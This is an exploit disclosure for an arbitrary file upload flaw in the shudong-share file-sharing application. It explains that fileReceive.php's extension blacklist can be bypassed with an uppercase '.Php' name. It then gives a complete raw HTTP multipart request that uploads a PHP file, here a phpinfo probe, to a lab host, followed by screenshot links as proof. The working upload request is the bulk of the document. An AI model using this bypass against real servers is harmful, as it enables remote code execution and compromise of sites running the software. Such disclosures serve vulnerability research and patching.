Exploit Title: shudong-share Any File Upload

Exploit Author: webraybtl@webray.com.cn inc

Vendor Homepage: https://github.com/HFO4/shudong-share

Software Link: https://github.com/HFO4/shudong-share

CMSName: shudong-share

Tested on: Windows, Nginx ,Mysql

Description

The reason for the vulnerability of arbitrary file upload is that the website application allows users to add any type of upload file extension in the management background, bypassing the whitelist restriction code. In addition, the fileReceiver. php code also performs a second blacklist check but can be bypassed using uppercase Php, resulting in arbitrary file upload.

    Payload used:
POST /shudong-share-2.4.7/shudong-share-2.4.7/includes/fileReceive.php HTTP/1.1
Host: 192.168.101.142
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzhrFFsicJe3Nlb5g
Content-Length: 195

------WebKitFormBoundaryzhrFFsicJe3Nlb5g
Content-Disposition: form-data; name="file";filename="1.Php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryzhrFFsicJe3Nlb5g--

Proof of Concept
![image](https://github.com/user-attachments/assets/d3deec05-98f3-490d-bea2-cc0680f2bf3c)
![image](https://github.com/user-attachments/assets/17d1b63d-767a-426f-b5f7-4271bd1f6ff5)
![image](https://github.com/user-attachments/assets/a6322441-0c5e-4e79-aea5-0b7091bf867a)
![image](https://github.com/user-attachments/assets/ea0d0976-2b1a-4ec6-a80f-9bf44fbb188d)


